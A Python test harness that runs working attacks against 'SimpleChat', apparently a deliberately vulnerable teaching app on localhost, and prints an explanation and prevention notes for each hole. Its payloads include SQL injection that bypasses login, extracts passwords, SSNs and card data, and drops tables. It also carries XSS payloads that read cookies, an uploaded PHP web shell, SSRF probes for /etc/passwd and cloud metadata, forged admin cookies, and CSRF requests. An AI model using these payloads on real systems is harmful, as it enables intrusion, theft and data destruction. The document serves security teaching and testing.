#!/usr/bin/env python3

import requests
import json
import sys
import time
from typing import Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin
import html

@dataclass
class TestResult:
    name: str
    success: bool
    details: str
    payload: str
    description: str  # Added field for educational purposes

class SimpleChatVulnerabilityTester:
    def __init__(self, base_url: str = "http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[TestResult] = []

    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("\n=== Starting SimpleChat Vulnerability Testing Suite ===")
        print("This suite demonstrates various web application vulnerabilities in SimpleChat.")
        print("Each test includes educational information about the vulnerability.")
        print("⚠️  For educational purposes only! ⚠️\n")
        
        try:
            # Authentication Attacks
            self.test_default_credentials()
            
            # SQL Injection in Login
            self.test_sql_injection_login()
            
            # Cookie Manipulation
            self.test_cookie_manipulation()
            
            # Predictable Conversation Hash
            self.test_predictable_conversation_hash()
            
            # XSS in Messages
            self.test_xss_in_messages()
            
            # CSRF Vulnerability
            self.test_csrf_password_change()
            
            # File Upload Vulnerability
            self.test_unrestricted_file_upload()
            
            # SSRF Vulnerability
            self.test_ssrf_profile_picture()
            
            # Sensitive Data Exposure
            self.test_sensitive_data_exposure()
            
            # SQL Injection in Search
            self.test_sql_injection_search()
            
            # SQL Injection in Messages
            self.test_sql_injection_messages()
            
            # Debug Mode Detection
            self.test_debug_mode()
            
        except Exception as e:
            print(f"Error running tests: {str(e)}")
            
        self.print_results()

    def add_result(self, name: str, success: bool, details: str, payload: str, description: str):
        """Add a test result with educational information"""
        self.results.append(TestResult(name, success, details, payload, description))

    def test_default_credentials(self):
        """Test default credentials"""
        print("\n=== Testing Default Credentials ===")
        description = """
        Vulnerability: Default/Hardcoded Credentials
        Impact: Attackers can gain unauthorized access using known default credentials
        How it works: The application ships with default admin credentials that
        are either not changed or cannot be changed.
        
        Prevention:
        1. Force password change on first login
        2. No hardcoded credentials in code
        3. Generate random admin password during installation
        4. Implement strong password policies
        """
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                }
            )
            
            # Check if login was successful by looking for redirection or dashboard content
            success = response.status_code == 302 or "dashboard" in response.text.lower() or "messages" in response.text.lower()
            
            details = (
                "Successfully logged in with default admin credentials"
                if success
                else "Default credentials test failed"
            )
            
            self.add_result(
                "Default Credentials",
                success,
                details,
                "admin:admin123",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Default Credentials",
                False,
                f"Error: {str(e)}",
                "admin:admin123",
                description
            )

    def test_sql_injection_login(self):
        """Test SQL injection in login form"""
        print("\n=== Testing SQL Injection (Login) ===")
        description = """
        Vulnerability: SQL Injection in Login Form
        Impact: Attackers can bypass authentication or extract data
        How it works: User input is directly concatenated into SQL queries
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        payloads = [
            {
                "name": "Basic login bypass",
                "username": "admin' OR '1'='1",
                "password": "anything"
            },
            {
                "name": "Basic login bypass via password",
                "username": "admin",
                "password": "' OR '1'='1"
            },
            {
                "name": "Comment out password check",
                "username": "admin'--",
                "password": "anything"
            },
            {
                "name": "OR with both fields",
                "username": "' OR 1=1 OR '",
                "password": "' OR 1=1 OR '"
            },
            {
                "name": "Simple OR condition",
                "username": "' OR 1=1 --",
                "password": "anything"
            }
        ]
        
        successes = []
        for payload in payloads:
            try:
                # Clear any existing cookies
                self.session.cookies.clear()
                
                response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={
                        "username": payload["username"],
                        "password": payload["password"]
                    },
                    allow_redirects=False  # Don't follow redirects to better detect success
                )
                
                # Check if login was successful by looking for redirection or cookies
                if response.status_code == 302 or 'current_user' in self.session.cookies:
                    successes.append(payload["name"])
                    break  # One success is enough
                
                # If we got redirected, check the next page for signs of successful login
                if response.status_code == 200 and "messages" in response.text.lower():
                    successes.append(payload["name"])
                    break  # One success is enough
                
            except Exception as e:
                print(f"Error testing SQL injection: {str(e)}")
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully exploited SQL injection: {', '.join(successes)}"
            if success
            else "SQL injection tests failed"
        )
        
        self.add_result(
            "SQL Injection (Login)",
            success,
            details,
            str(payloads),
            description
        )

    def test_cookie_manipulation(self):
        """Test cookie manipulation vulnerabilities"""
        print("\n=== Testing Cookie Manipulation ===")
        description = """
        Vulnerability: Cookie Manipulation / Request Forgery
        Impact: Attackers can modify cookies to impersonate other users
        How it works: The application uses plain text cookies for authentication
        without proper validation or signing.
        
        Prevention:
        1. Use secure session management
        2. Sign cookies with strong cryptographic keys
        3. Implement proper authentication checks
        4. Use secure session tokens instead of plaintext values
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First check if we can access profile without login
            initial_response = self.session.get(
                urljoin(self.base_url, "/profile"),
                allow_redirects=False
            )
            
            # If we're redirected, we need to login
            if initial_response.status_code == 302:
                # Set cookies directly without logging in
                self.session.cookies.set('current_user', 'admin')
                self.session.cookies.set('is_admin', 'true')
                
                # Try to access admin profile
                admin_response = self.session.get(
                    urljoin(self.base_url, "/profile")
                )
                
                # Check if we successfully accessed admin profile
                success = admin_response.status_code == 200 and "admin" in admin_response.text
                
                # If that didn't work, try accessing a different protected page
                if not success:
                    dashboard_response = self.session.get(
                        urljoin(self.base_url, "/dashboard")
                    )
                    success = dashboard_response.status_code == 200 and "dashboard" in dashboard_response.text.lower()
                
                details = (
                    "Successfully accessed protected content by manipulating cookies"
                    if success
                    else "Cookie manipulation failed"
                )
            else:
                success = False
                details = "Authentication check not working - could access profile without login"
            
            self.add_result(
                "Cookie Manipulation",
                success,
                details,
                "Set cookie: current_user=admin, is_admin=true",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Cookie Manipulation",
                False,
                f"Error: {str(e)}",
                "Cookie manipulation",
                description
            )

    def test_predictable_conversation_hash(self):
        """Test predictable conversation hash vulnerability"""
        print("\n=== Testing Predictable Conversation Hash ===")
        description = """
        Vulnerability: Predictable Conversation Hash
        Impact: Attackers can access private conversations between other users
        How it works: The application uses a weak hash function (MD5) with predictable
        inputs to generate conversation identifiers.
        
        Prevention:
        1. Use strong cryptographic functions
        2. Include unpredictable values (e.g., random salt)
        3. Implement proper access controls
        4. Don't rely on obscurity for security
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Try a brute force approach - generate hashes for different user combinations
            import hashlib
            
            # Try different combinations of user IDs
            test_hashes = []
            for i in range(1, 5):  # User ID 1
                for j in range(i+1, 6):  # User ID 2
                    # Ensure smaller ID is first
                    user1, user2 = min(i, j), max(i, j)
                    conversation_string = f"conversation_{user1}_{user2}"
                    hash_value = hashlib.md5(conversation_string.encode()).hexdigest()
                    test_hashes.append((hash_value, user1, user2))
            
            # Try each hash
            for test_hash, user1, user2 in test_hashes:
                try:
                    convo_response = self.session.get(
                        urljoin(self.base_url, f"/conversation/{test_hash}")
                    )
                    
                    # Check if we successfully accessed a conversation
                    if convo_response.status_code == 200 and "message" in convo_response.text.lower():
                        success = True
                        details = f"Successfully accessed conversation between users {user1} and {user2} with hash: {test_hash}"
                        break
                except:
                    continue
            else:
                # If we didn't break out of the loop, all tests failed
                success = False
                details = "Could not access any conversations with predicted hashes"
            
            self.add_result(
                "Predictable Conversation Hash",
                success,
                details,
                f"Accessed conversation with hash: {test_hash if success else None}",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Predictable Conversation Hash",
                False,
                f"Error: {str(e)}",
                "Conversation hash test",
                description
            )

    def test_xss_in_messages(self):
        """Test XSS vulnerability in messages"""
        print("\n=== Testing XSS in Messages ===")
        description = """
        Vulnerability: Cross-Site Scripting (XSS) in Messages
        Impact: Attackers can inject malicious scripts that execute in victims' browsers
        How it works: User input in messages is not properly sanitized or escaped
        before being displayed to other users.
        
        Prevention:
        1. Input validation and sanitization
        2. Output encoding
        3. Content Security Policy (CSP)
        4. Use safe templating engines that auto-escape content
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Find a user to message
            response = self.session.get(urljoin(self.base_url, "/new_chat"))
            
            # Extract a username from the response
            import re
            usernames = re.findall(r'value="([^"]+)"', response.text)
            target_user = None
            for username in usernames:
                if username and username != "john.doe" and username != "":
                    target_user = username
                    break
            
            if not target_user:
                target_user = "admin"  # Fallback to admin
            
            # XSS payloads to test
            xss_payloads = [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror='alert(1)'>",
                "<svg/onload=alert('XSS')>"
            ]
            
            # Send a message with XSS payload
            success = False
            successful_payload = None
            
            # First check what the form field name is by examining the page
            convo_page = self.session.get(
                urljoin(self.base_url, f"/messages/{target_user}")
            )
            
            # Look for the form field name in the HTML
            form_field_names = re.findall(r'name="([^"]+)".*?placeholder="Type a message', convo_page.text, re.DOTALL)
            message_field_name = form_field_names[0] if form_field_names else "message"
            
            for payload in xss_payloads:
                # Try different field names that might be used
                for field_name in [message_field_name, "content", "message"]:
                    try:
                        message_data = {field_name: payload}
                        message_response = self.session.post(
                            urljoin(self.base_url, f"/messages/{target_user}"),
                            data=message_data
                        )
                        
                        # Check if the payload was stored (appears in the response)
                        if payload in message_response.text:
                            success = True
                            successful_payload = payload
                            break
                    except:
                        continue
                
                if success:
                    break
            
            if success:
                details = f"Successfully stored XSS payload in message: {successful_payload}"
            else:
                details = "Failed to store XSS payloads in messages"
            
            self.add_result(
                "XSS in Messages",
                success,
                details,
                str(xss_payloads),
                description
            )
            
        except Exception as e:
            self.add_result(
                "XSS in Messages",
                False,
                f"Error: {str(e)}",
                "XSS test",
                description
            )

    def test_csrf_password_change(self):
        """Test CSRF vulnerability in password change"""
        print("\n=== Testing CSRF in Password Change ===")
        description = """
        Vulnerability: Cross-Site Request Forgery (CSRF)
        Impact: Attackers can perform actions on behalf of authenticated users
        How it works: The application accepts state-changing requests without
        verifying they originated from a legitimate source.
        
        Prevention:
        1. Implement CSRF tokens
        2. SameSite cookie attribute
        3. Custom request headers
        4. Verify Origin/Referer headers
        """
        
        try:
            # First login as a user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Try to change password with a different origin
            headers = {
                "Origin": "http://evil-site.com",
                "Referer": "http://evil-site.com/csrf.html"
            }
            
            csrf_response = self.session.post(
                urljoin(self.base_url, "/change-password"),
                data={
                    "current_password": "password123",
                    "new_password": "hacked123",
                    "confirm_password": "hacked123"
                },
                headers=headers
            )
            
            # Check if the password change was successful despite different origin
            success = csrf_response.status_code == 200 and "success" in csrf_response.text.lower()
            
            details = (
                "Successfully changed password via CSRF (no CSRF protection)"
                if success
                else "CSRF test failed"
            )
            
            self.add_result(
                "CSRF Vulnerability",
                success,
                details,
                "POST request with different origin",
                description
            )
            
        except Exception as e:
            self.add_result(
                "CSRF Vulnerability",
                False,
                f"Error: {str(e)}",
                "CSRF test",
                description
            )

    def test_unrestricted_file_upload(self):
        """Test unrestricted file upload vulnerability"""
        print("\n=== Testing Unrestricted File Upload ===")
        description = """
        Vulnerability: Unrestricted File Upload
        Impact: Attackers can upload malicious files that could lead to remote code execution
        How it works: The application allows uploading files without proper validation
        of file type, content, or size.
        
        Prevention:
        1. Validate file extensions and content types
        2. Scan file contents for malicious code
        3. Store uploaded files outside web root
        4. Generate random filenames
        5. Set proper permissions on uploaded files
        """
        
        try:
            # First login as a user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Create a malicious PHP file
            php_payload = """<?php
            echo "Malicious file executed!";
            system($_GET['cmd']);
            ?>"""
            
            files = {
                'file': ('malicious.php', php_payload, 'application/x-php')
            }
            
            # Try to upload the file
            upload_response = self.session.post(
                urljoin(self.base_url, "/upload-file"),
                files=files
            )
            
            # Check if the upload was successful
            success = upload_response.status_code == 200 and "success" in upload_response.text.lower()
            
            details = (
                "Successfully uploaded malicious PHP file"
                if success
                else "File upload test failed"
            )
            
            self.add_result(
                "Unrestricted File Upload",
                success,
                details,
                "Uploaded malicious.php with PHP code",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Unrestricted File Upload",
                False,
                f"Error: {str(e)}",
                "File upload test",
                description
            )

    def test_ssrf_profile_picture(self):
        """Test SSRF vulnerability in profile picture URL"""
        print("\n=== Testing SSRF in Profile Picture URL ===")
        description = """
        Vulnerability: Server-Side Request Forgery (SSRF)
        Impact: Attackers can make the server request internal resources
        How it works: The application makes HTTP requests to user-supplied URLs
        without proper validation.
        
        Prevention:
        1. Validate and sanitize URL input
        2. Use allowlists for domains
        3. Block requests to internal networks
        4. Disable unnecessary URL schemes
        """
        
        try:
            # First login as a user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # SSRF payloads to test
            ssrf_payloads = [
                {
                    "url": "http://localhost:22",
                    "description": "Internal SSH port scan"
                },
                {
                    "url": "file:///etc/passwd",
                    "description": "Local file access"
                },
                {
                    "url": "http://169.254.169.254/latest/meta-data",
                    "description": "AWS metadata service"
                }
            ]
            
            for payload in ssrf_payloads:
                # Try to update profile picture with SSRF URL
                ssrf_response = self.session.post(
                    urljoin(self.base_url, "/update-profile-picture"),
                    data={"picture_url": payload["url"]}
                )
                
                # Check if the request was processed (not rejected)
                if ssrf_response.status_code == 200 and "error" not in ssrf_response.text.lower():
                    success = True
                    details = f"Successfully triggered SSRF with URL: {payload['url']} ({payload['description']})"
                    self.add_result(
                        "SSRF Vulnerability",
                        success,
                        details,
                        payload["url"],
                        description
                    )
                    return
            
            # If we get here, none of the payloads worked
            self.add_result(
                "SSRF Vulnerability",
                False,
                "Failed to trigger SSRF vulnerability",
                str(ssrf_payloads),
                description
            )
            
        except Exception as e:
            self.add_result(
                "SSRF Vulnerability",
                False,
                f"Error: {str(e)}",
                "SSRF test",
                description
            )

    def test_sensitive_data_exposure(self):
        """Test sensitive data exposure in user profiles"""
        print("\n=== Testing Sensitive Data Exposure ===")
        description = """
        Vulnerability: Sensitive Data Exposure
        Impact: Attackers can access sensitive user information
        How it works: The application exposes sensitive data in:
        - User profiles
        - API responses
        - Debug endpoints
        
        Prevention:
        1. Minimize sensitive data exposure
        2. Implement proper data classification
        3. Encrypt sensitive data
        4. Use proper access controls
        """
        
        try:
            # First login as a user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Check for sensitive data in profile
            profile_response = self.session.get(
                urljoin(self.base_url, "/profile")
            )
            
            # Sensitive data patterns to look for
            sensitive_patterns = [
                "credit_card",
                "ssn",
                "date_of_birth",
                "address",
                "phone"
            ]
            
            # Check if sensitive data is exposed
            response_text = profile_response.text.lower()
            exposed_data = []
            
            for pattern in sensitive_patterns:
                if pattern in response_text:
                    exposed_data.append(pattern)
            
            # Also check debug endpoints
            debug_response = self.session.get(
                urljoin(self.base_url, "/debug/all-users")
            )
            
            if debug_response.status_code == 200:
                try:
                    debug_data = debug_response.json()
                    debug_text = json.dumps(debug_data).lower()
                    
                    for pattern in sensitive_patterns:
                        if pattern in debug_text and pattern not in exposed_data:
                            exposed_data.append(f"{pattern} (in debug endpoint)")
                except:
                    pass
            
            success = len(exposed_data) > 0
            details = (
                f"Found exposed sensitive data: {', '.join(exposed_data)}"
                if success
                else "No sensitive data exposure found"
            )
            
            self.add_result(
                "Sensitive Data Exposure",
                success,
                details,
                "Checked user profile and debug endpoints",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Sensitive Data Exposure",
                False,
                f"Error: {str(e)}",
                "Sensitive data test",
                description
            )

    def test_sql_injection_search(self):
        """Test SQL injection in search functionality"""
        print("\n=== Testing SQL Injection (Search) ===")
        description = """
        Vulnerability: SQL Injection in Search Function
        Impact: Attackers can extract sensitive data or manipulate database
        How it works: Search query is directly concatenated into SQL query
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        try:
            # First login as a user
            self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # SQL injection payloads to test
            sql_payloads = [
                {
                    "payload": "' OR '1'='1",
                    "description": "Show all users"
                },
                {
                    "payload": "' UNION SELECT username,password,id,email,full_name,address,phone,credit_card,ssn,date_of_birth FROM user--",
                    "description": "Extract user credentials"
                },
                {
                    "payload": "' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--",
                    "description": "Extract database schema"
                }
            ]
            
            for payload in sql_payloads:
                # Try SQL injection in search
                search_response = self.session.get(
                    urljoin(self.base_url, f"/search?q={payload['payload']}")
                )
                
                # Check if the injection was successful (look for sensitive data or multiple results)
                response_text = search_response.text.lower()
                
                # Check for signs of successful injection
                success_indicators = [
                    "password",
                    "credit_card",
                    "ssn",
                    "sqlite_master",
                    "create table"
                ]
                
                if any(indicator in response_text for indicator in success_indicators):
                    success = True
                    details = f"Successfully exploited SQL injection with payload: {payload['payload']} ({payload['description']})"
                    self.add_result(
                        "SQL Injection (Search)",
                        success,
                        details,
                        payload['payload'],
                        description
                    )
                    return
            
            # If we get here, none of the payloads worked
            self.add_result(
                "SQL Injection (Search)",
                False,
                "Failed to exploit SQL injection in search",
                str(sql_payloads),
                description
            )
            
        except Exception as e:
            self.add_result(
                "SQL Injection (Search)",
                False,
                f"Error: {str(e)}",
                "SQL injection test",
                description
            )

    def test_sql_injection_messages(self):
        """Test SQL injection in message sending functionality"""
        print("\n=== Testing SQL Injection (Messages) ===")
        description = """
        Vulnerability: SQL Injection in Message Content
        Impact: Attackers can extract sensitive data or manipulate database through message content
        How it works: Message content might be vulnerable to SQL injection if the application
        doesn't properly sanitize or parameterize the input before inserting it into the database.
        
        Prevention:
        1. Use parameterized queries (already implemented, but testing for completeness)
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
                    "Failed to login for message SQL injection test",
                    "Login attempt",
                    description
                )
                return
                
            # SQL injection payloads to test in messages
            sql_payloads = [
                {
                    "payload": "test message', (SELECT password FROM user WHERE username='admin')), (1, 1, 'Leaked password: ", 
                    "description": "Extract admin password and insert it as a new message"
                },
                {
                    "payload": "test message'; DROP TABLE message; --", 
                    "description": "Attempt to drop the message table"
                },
                {
                    "payload": "test message'; DELETE FROM message WHERE 1=1; --", 
                    "description": "Delete all messages"
                },
                {
                    "payload": "test message', (SELECT group_concat(username || ':' || password) FROM user)), (1, 1, 'All users: ", 
                    "description": "Extract all usernames and passwords"
                }
            ]
            
            # Send a message with SQL injection to another user (e.g., admin)
            recipient = "admin"
            
            for payload in sql_payloads:
                # Send message with SQL injection payload to the vulnerable endpoint
                message_response = self.session.post(
                    urljoin(self.base_url, f"/send-message-vulnerable/{recipient}"),
                    data={"message": payload["payload"]}
                )
                
                # Check if the message was sent successfully
                if message_response.status_code == 200:
                    # Now check if we can see the message in the conversation
                    conversation_response = self.session.get(
                        urljoin(self.base_url, f"/messages/{recipient}")
                    )
                    
                    # Check for signs of successful injection
                    response_text = conversation_response.text.lower()
                    success_indicators = [
                        "leaked password",
                        "all users:",
                        "error",  # SQL error might indicate successful injection attempt
                        payload["payload"]  # If payload is visible, it was at least stored
                    ]
                    
                    if any(indicator in response_text.lower() for indicator in success_indicators):
                        success = True
                        details = f"Successfully exploited SQL injection with payload: {payload['payload']} ({payload['description']})"
                    else:
                        success = False
                        details = f"Message was sent but no evidence of successful injection: {payload['payload']}"
                else:
                    # If we get an error response, it might actually indicate a successful injection
                    # (e.g., if we dropped a table or deleted data)
                    success = True
                    details = f"Possible successful injection (caused error): {payload['payload']} ({payload['description']})"
                
                self.add_result(
                    "SQL Injection (Messages)",
                    success,
                    details,
                    payload['payload'],
                    description
                )
                
                # If we successfully sent a message, no need to try more payloads
                if success:
                    return
            
        except Exception as e:
            self.add_result(
                "SQL Injection (Messages)",
                False,
                f"Error: {str(e)}",
                "SQL injection in messages test",
                description
            )

    def test_debug_mode(self):
        """Test debug mode and information disclosure"""
        print("\n=== Testing Debug Mode ===")
        description = """
        Vulnerability: Debug Mode Enabled
        Impact: Attackers can access sensitive debug information and potentially
        execute arbitrary code through the debug console.
        How it works: The application runs with debug mode enabled in production,
        exposing detailed error messages and debug features.
        
        Prevention:
        1. Disable debug mode in production
        2. Use proper error handling
        3. Implement logging instead of debug output
        4. Use environment-specific configurations
        """
        
        try:
            # Check for debug endpoints
            debug_endpoints = [
                "/debug/users",
                "/debug/schema",
                "/debug/data",
                "/debug/all-users",
                "/debug/conversation_hashes",
                "/endpoints"
            ]
            
            accessible_endpoints = []
            
            for endpoint in debug_endpoints:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code == 200:
                    accessible_endpoints.append(endpoint)
            
            # Also check for detailed error messages
            error_response = self.session.get(
                urljoin(self.base_url, "/nonexistent_page_to_trigger_error")
            )
            
            error_indicators = [
                "traceback",
                "debug",
                "error",
                "exception",
                "stack trace",
                "line",
                "file"
            ]
            
            detailed_error = any(indicator in error_response.text.lower() for indicator in error_indicators)
            
            success = len(accessible_endpoints) > 0 or detailed_error
            
            details_parts = []
            if accessible_endpoints:
                details_parts.append(f"Accessible debug endpoints: {', '.join(accessible_endpoints)}")
            if detailed_error:
                details_parts.append("Detailed error messages exposed")
            
            details = " | ".join(details_parts) if details_parts else "No debug mode indicators found"
            
            self.add_result(
                "Debug Mode Enabled",
                success,
                details,
                "Checked debug endpoints and error handling",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Debug Mode Enabled",
                False,
                f"Error: {str(e)}",
                "Debug mode test",
                description
            )

    def print_results(self):
        """Print test results in a formatted way"""
        print("\n=== VULNERABILITY TEST RESULTS ===\n")
        
        total_tests = len(self.results)
        successful_tests = sum(1 for r in self.results if r.success)
        
        print(f"Total Tests: {total_tests}")
        print(f"Vulnerabilities Found: {successful_tests}")
        print(f"Failed Tests: {total_tests - successful_tests}")
        print("\nDetailed Results:")
        print("=" * 100)
        
        for result in self.results:
            print(f"\nTest: {result.name}")
            print(f"Status: {'✅ VULNERABLE' if result.success else '❌ NOT VULNERABLE'}")
            print("\nDescription:")
            print(result.description)
            print("\nDetails:", result.details)
            print("\nPayload:", result.payload)
            print("-" * 100)

def main():
    print("""
    🚨 SimpleChat Vulnerability Testing Suite 🚨
    =========================================
    
    This tool demonstrates various web application vulnerabilities in SimpleChat for educational purposes.
    Each test includes:
    - Vulnerability description
    - How it works
    - Impact
    - Prevention measures
    
    ⚠️  WARNING: Use only in controlled environments! ⚠️
    """)
    
    try:
        tester = SimpleChatVulnerabilityTester()
        tester.run_all_tests()
        
    except requests.exceptions.ConnectionError:
        print("\nERROR: Cannot connect to the application.")
        print("Make sure it's running at http://localhost:5001")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nTesting interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main() 